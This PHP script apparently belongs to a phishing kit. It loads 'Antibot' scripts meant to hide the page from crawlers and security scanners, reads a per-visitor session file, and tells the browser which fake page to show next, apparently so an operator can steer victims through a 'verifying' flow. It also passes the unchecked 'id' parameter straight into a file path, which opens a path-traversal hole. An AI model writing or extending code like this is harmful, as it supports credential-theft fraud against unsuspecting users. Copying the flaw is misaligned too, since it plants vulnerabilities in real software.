<?php


error_reporting(0);

include('../Antibot/Bot-Crawler.php');
include('../Antibot/Dila_DZ.php');
include('../Antibot/blockers.php');
include('../Antibot/detects.php');

session_start();
$config = include('../admin/config.php');
$id = $_GET['id'];
$userData = json_decode(file_get_contents("../sessions/$id.json"), true);
$page = $userData['page'];

$response = ['redirect' => false];

if ($page != 'verifying') {
    $response['redirect'] = true;
    $response['redirect_url'] = "$page.php?id=$id";
}

echo json_encode($response);
?>